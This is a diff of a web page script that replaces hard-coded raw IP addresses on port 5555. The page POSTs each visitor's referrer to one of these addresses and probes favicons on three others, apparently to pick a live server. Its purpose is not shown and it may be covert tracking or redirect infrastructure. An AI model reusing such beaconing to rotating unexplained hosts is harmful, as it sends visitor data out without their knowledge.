@@ -40,7 +40,7 @@ xmlhttp.onreadystatechange = function() {
     console.log("ok");
   }
 };
-var url = "https://94.131.14.3:5555/u/";
+var url = "https://103.113.69.49:5555/u/";
 var params = "referrer=" + encodeURIComponent(referrer);
 xmlhttp.open("POST", url, true);
 xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
@@ -136,9 +136,9 @@ xmlhttp.send(params);
         return url.replace(/\/favicon\.ico$/, '/');
     }
 
-    checkIcon('https://94.131.14.3:5555/favicon.ico', 'result1', 10000);
-    checkIcon('https://94.131.13.166:5555/favicon.ico', 'result2', 10000);
-    checkIcon('https://94.131.14.250:5555/favicon.ico', 'result3', 10000);
+    checkIcon('https://94.131.13.149:5555/favicon.ico', 'result1', 10000);
+    checkIcon('https://94.131.14.250:5555/favicon.ico', 'result2', 10000);
+    checkIcon('https://103.113.69.49:5555/favicon.ico', 'result3', 10000);
 </script>
 
 </body>
